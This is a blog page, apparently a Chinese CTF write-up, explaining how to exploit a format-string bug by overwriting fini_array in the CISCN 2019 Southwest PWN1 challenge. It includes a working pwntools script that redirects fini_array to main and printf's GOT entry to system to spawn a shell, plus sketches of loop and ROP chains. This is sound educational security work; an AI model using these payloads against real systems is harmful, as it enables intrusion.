@@ -1,0 +1,777 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    格式化字符串漏洞利用fini_array及其拓展应用 |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="控制fini_array从而达到控制程序执行流的目的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞利用fini_array及其拓展应用">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/04/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8fini_array%E5%8F%8A%E5%85%B6%E6%8B%93%E5%B1%95/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="控制fini_array从而达到控制程序执行流的目的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417191104447-1727328210.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193622797-663247872.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193708554-726865675.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193720473-1597270008.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417194227354-346207356.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417194847737-1968385427.png">
+<meta property="article:published_time" content="2024-04-17T12:15:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:04:38.963Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417191104447-1727328210.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="格式化字符串漏洞利用fini_array及其拓展应用">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">格式化字符串漏洞利用fini_array及其拓展应用</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-格式化字符串漏洞利用fini_array及其拓展" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/04/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8fini_array%E5%8F%8A%E5%85%B6%E6%8B%93%E5%B1%95/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-04-17T12:15:00.000Z" itemprop="datePublished">2024-04-17</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-aos="zoom-in">网络安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="导言"><a class="markdownIt-Anchor" href="#导言"></a> 导言</h1>
+<p>这类题型还是我复现CISCN_2019_西南的PWN1的时候遇见的，算是涨知识了</p>
+<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1>
+<p>我们都知道，在程序中最先调用的不是<code>main</code>,也不是<code>__libc_start_main</code>，而是<code>_start</code>，我们来看一下再x86下的<code>_start</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:08048420                     public _start</span><br><span class="line">.text:08048420     _start          proc near               ; DATA XREF: .LOAD:08048018↑o</span><br><span class="line">.text:08048420 000                 xor     ebp, ebp        ; Logical Exclusive OR</span><br><span class="line">.text:08048422 000                 pop     esi</span><br><span class="line">.text:08048423 -04                 mov     ecx, esp</span><br><span class="line">.text:08048425 -04                 and     esp, 0FFFFFFF0h ; Logical AND</span><br><span class="line">.text:08048428 -04                 push    eax</span><br><span class="line">.text:08048429 000                 push    esp             ; stack_end</span><br><span class="line">.text:0804842A 004                 push    edx             ; rtld_fini</span><br><span class="line">.text:0804842B 008                 push    offset __libc_csu_fini ; fini</span><br><span class="line">.text:08048430 00C                 push    offset __libc_csu_init ; init</span><br><span class="line">.text:08048435 010                 push    ecx             ; ubp_av</span><br><span class="line">.text:08048436 014                 push    esi             ; argc</span><br><span class="line">.text:08048437 018                 push    offset main     ; main</span><br><span class="line">.text:0804843C 01C                 call    ___libc_start_main ; Call Procedure</span><br><span class="line">.text:08048441 01C                 hlt                     ; Halt</span><br><span class="line">.text:08048441     _start          endp</span><br><span class="line">.text:08048441</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，在_start结束的时候会调用<code>__libc_start_main</code>，而我们再看__libc_start_main的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// attributes: thunk</span><br><span class="line">int __cdecl __libc_start_main(</span><br><span class="line">        int (__cdecl *main)(int, char **, char **),</span><br><span class="line">        int argc,</span><br><span class="line">        char **ubp_av,</span><br><span class="line">        void (*init)(void),</span><br><span class="line">        void (*fini)(void),</span><br><span class="line">        void (*rtld_fini)(void),</span><br><span class="line">        void *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  return _libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);</span><br></pre></td></tr></table></figure>
+<p>可以看到，包含有<code>main,init,fini</code>，既然传进去了这些参数，那必然有他们的用处,main和init就不用多说了，fini是做什么的呢？我们得跟进看一看。<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417191104447-1727328210.png" alt="image" /><br />
+可以看到，<strong>__libc_start_main的返回地址就是__libc_csu_fini</strong>，证明它是在__libc_start_main在结束后就会调用__libc_csu_fini，要是我们能对它进行一些修改，那说不定就能做一些“坏事”。我们来看看跟它相关的东西。<br />
+我们可以在fini_array段找到与__libc_csu_fini相关的东西，是数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:0804979C     ; ELF Termination Function Table</span><br><span class="line">.fini_array:0804979C     ; ===========================================================================</span><br><span class="line">.fini_array:0804979C</span><br><span class="line">.fini_array:0804979C     ; Segment type: Pure data</span><br><span class="line">.fini_array:0804979C     ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:0804979C     _fini_array     segment dword public &#x27;DATA&#x27; use32</span><br><span class="line">.fini_array:0804979C                     assume cs:_fini_array</span><br><span class="line">.fini_array:0804979C                     ;org 804979Ch</span><br><span class="line">.fini_array:0804979C     __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux</span><br><span class="line">.fini_array:0804979C                                             ; DATA XREF: __libc_csu_init+16↑o</span><br><span class="line">.fini_array:0804979C     _fini_array     ends                    ; Alternative name is &#x27;__init_array_end&#x27;</span><br><span class="line">.fini_array:0804979C</span><br></pre></td></tr></table></figure>
+<p>在这个数组里存放着一些函数的指针，并且<strong>在进入__do_global_dtors_aux这个函数中会遍历并且调用各个指针，__do_global_dtors_aux_fini_array_entry是一个在程序结束时需要调用的函数的名称，它的地址偏移量在这里被存储</strong>，也就是说，如果我们能<strong>把__do_global_dtors_aux_fini_array_entry指向的地址变为main函数或者其它的地址，就可以进行一些非法操作</strong><br />
+这就是fini_array在x86下格式化字符串的基本应用<br />
+不过需要注意的是，<code>_init_array的下标是从小到大开始执行，而_fini_array的下标是从大到小开始执行</code>这对我们构造payload起到非常关键的作用</p>
+<h1 id="例题-ciscn-2019西南pwn1"><a class="markdownIt-Anchor" href="#例题-ciscn-2019西南pwn1"></a> 例题 [CISCN 2019西南]PWN1</h1>
+<h2 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h2>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193622797-663247872.png" alt="image" /><br />
+基本没什么保护，看起来很简单的样子</p>
+<h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h2>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193708554-726865675.png" alt="image" /><br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417193720473-1597270008.png" alt="image" /><br />
+主函数有格式化字符串漏洞，而且看起来有后门给我们跳转的样子。但不可能，<strong>scanf限宽，只让我们输入64个字符</strong>，不够我们进行栈溢出，并且也只能执行一次格式化字符串漏洞，看起来无计可施了对不对？这个时候就该使用我们压箱底的fini_array了<br />
+因为__libc_start_main的函数返回地址是__libc_csu_fini，而fini_array与它相关联，我们只要把fini_array里的内容给修改了就好。<br />
+让我们看看最开始**__do_global_dtors_aux_fini_array_entry指向谁**<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417194227354-346207356.png" alt="image" /><br />
+就跟我在上面写的一样，是__do_global_dtors_aux，那么我们只要把它修改成main函数的地址，就可以再次执行main函数，我们先修改一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fini_array = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">payload = p32(fini_array + <span class="number">2</span>) + p32(fini_array)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x0804</span> - <span class="number">0x08</span>).encode() + <span class="string">b&#x27;c%4$hn&#x27;</span> <span class="comment">#减去0x08是因为前边已经输入了八字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x8534</span> - <span class="number">0x0804</span>).encode() + <span class="string">b&#x27;c%5$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>OK，现在我们再看看<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240417194847737-1968385427.png" alt="image" /><br />
+可以看到已经成功修改了，因为在这里边会<strong>将指针遍历并调用</strong>，所以我们会再次执行main函数<br />
+至于为什么是倒序写fini_array，就跟我上面说的fini_array的下标是从大到小开始执行的，所以越往后越先执行<br />
+既然我们能再一次调用main函数，那么我们就可以在第一次main函数执行的时候把printf@got指向system@plt，在第二次main函数执行时，就可以直接往scanf里传<code>/bin/sh\x00</code>，从而达到getshell的效果，跟后门一样。</p>
+<h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./xinan_PWN1&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28906)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./xinan_PWN1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x804979C</span></span><br><span class="line">printf_got = <span class="number">0x804989C</span><span class="comment">#elf.got[&#x27;printf&#x27;]</span></span><br><span class="line">system_plt = <span class="number">0x80483D0</span><span class="comment">#elf.plt[&#x27;system&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span><span class="comment">#elf.symbols[&#x27;main&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = p32(fini_array+<span class="number">2</span>) + p32(printf_got + <span class="number">2</span>) + p32(printf_got) + p32(fini_array)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x0804</span> - <span class="number">0x10</span>).encode() + <span class="string">b&#x27;c%4$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x83D0</span> - <span class="number">0x0804</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x8534</span> - <span class="number">0x83D0</span>).encode() + <span class="string">b&#x27;c%7$hn&#x27;</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="后日谈"><a class="markdownIt-Anchor" href="#后日谈"></a> 后日谈</h1>
+<p>这玩意在x64的情况其实跟x86差不多（特指格式化字符串），就是多了寄存器传参，步骤会变得更加繁琐一点。这个技巧我觉得更适用于<strong>无计可施的时候</strong>，在其它攻击方法能用的时候，都不会挑这个来用，只有想不到别的办法的时候，它的价值才体现出来<br />
+当然，fini_array的作用远不止于此，它还可以和更多的攻击方式利用起来<br />
+比如</p>
+<h2 id="loop链"><a class="markdownIt-Anchor" href="#loop链"></a> Loop链</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[<span class="number">0</span>] = __libc_csu_fini</span><br><span class="line">fini_array[<span class="number">1</span>] = target_addr</span><br></pre></td></tr></table></figure>
+<p>因为是从大到小开始执行，所以它的执行流程是这样的<br />
+<code>_start--&gt;__libc_start_main--&gt;libc_csu_init--&gt;main--&gt;libc_csu_fini--&gt;target_addr--&gt;libc_csu_fini--&gt;target_addr--&gt;...</code><br />
+<strong>只要你不改变fini_array的值，我们就可以无限次执行下去</strong>，任何的one_byte漏洞都会被无限放大，实现任意地址写</p>
+<h2 id="rop链攻击"><a class="markdownIt-Anchor" href="#rop链攻击"></a> ROP链攻击</h2>
+<p><strong>这个常常与栈迁移联系在一起</strong><br />
+当栈空间不足时，我们可以把栈迁移到fini_array里去，先构造Loop链使它无限循环，然后<strong>往fini_array * 0x10后布置ROP链</strong><br />
+当ROP链布置完后，要想跳出循环</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]修改为leave_ret</span><br><span class="line">fini_array[1]修改为ret</span><br></pre></td></tr></table></figure>
+<p>修改完后就能getshell了</p>
+<p>至于为什么没有例题…是因为我还没有遇到，如果有我后续会补上来的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Stack/" rel="tag">Stack</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://s2.loli.net/2024/11/29/Q4LIrtisZbphCyo.jpg" data-sizes="auto" alt="劫持__malloc_hook" class="lazyload">
+          
+        
+        <a href="/2024/04/23/%E5%8A%AB%E6%8C%81_malloc_hook(%E5%8A%A0%E5%85%A5tcache_bins%E5%90%8E)/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            劫持__malloc_hook
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/12/02/Si7QexIJTgXNG5R.png" data-sizes="auto" alt="unlink" class="lazyload">
+        
+      
+      <a href="/2024/04/06/unlink(smallbins)/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          unlink
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2019%E8%A5%BF%E5%8D%97pwn1"><span class="toc-number">3.</span> <span class="toc-text"> 例题 [CISCN 2019西南]PWN1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">3.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text"> 代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.3.</span> <span class="toc-text"> Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%97%A5%E8%B0%88"><span class="toc-number">4.</span> <span class="toc-text"> 后日谈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#loop%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text"> Loop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop%E9%93%BE%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text"> ROP链攻击</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
